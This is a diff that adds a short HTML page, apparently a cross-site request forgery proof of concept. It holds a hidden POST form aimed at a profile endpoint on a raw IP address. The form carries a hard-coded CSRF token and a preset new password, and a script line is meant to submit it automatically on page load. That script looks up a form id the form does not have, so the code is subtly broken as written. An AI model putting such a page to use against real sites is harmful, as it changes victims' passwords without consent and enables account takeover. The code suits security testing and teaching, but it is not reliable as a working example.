@@ -1,0 +1,12 @@
+<html>
+    <form method="POST" action="http://34.247.74.38/profile/">
+       <label>Bio:</label>
+      <input type="hidden" name="_csrf" value="3267472bbb1efa4d2c52d7c8c782294ec66648c1f16df0a63c1031e1c0d33768">
+      <input name="bio" value="Hi, I am Alice!"><br>
+      <label>New Password:</label>
+      <input type="password" name="password" placeholder="Leave blank to keep current" value="newsecurepass"><br>
+      <button type="submit">Update</button>
+
+    </form>
+<script>document.getElementById("csrf-form").submit();</script>
+</html>
